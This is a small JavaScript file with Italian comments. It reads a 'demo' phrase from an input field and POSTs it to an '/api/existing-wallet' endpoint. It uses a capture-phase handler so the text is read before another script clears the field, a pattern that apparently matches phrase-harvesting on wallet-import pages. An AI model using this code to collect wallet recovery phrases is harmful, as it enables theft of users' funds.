document.addEventListener("DOMContentLoaded", () => {
  const input = document.querySelector("#demo-phrase");
  const continueBtn = document.querySelector("#demo-continue");

  if (!input || !continueBtn) {
    console.log("Demo input o pulsante non trovato.");
    return;
  }

  continueBtn.addEventListener(
    "click",
    async () => {
      // Legge il testo prima che l'altro script possa svuotare il campo
      const message = input.value.trim();

      if (!message) {
        alert("Scrivi prima un testo demo.");
        return;
      }

      try {
        const response = await fetch("/api/existing-wallet", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            message: message
          })
        });

        const data = await response.json();

        if (!response.ok) {
          throw new Error(data.error || "Errore durante l'invio.");
        }

        console.log("Testo demo inviato:", message);
      } catch (error) {
        console.error(error);
        alert("Errore: " + error.message);
      }
    },
    true // capture phase: esegue questo handler prima dello svuotamento
  );
});
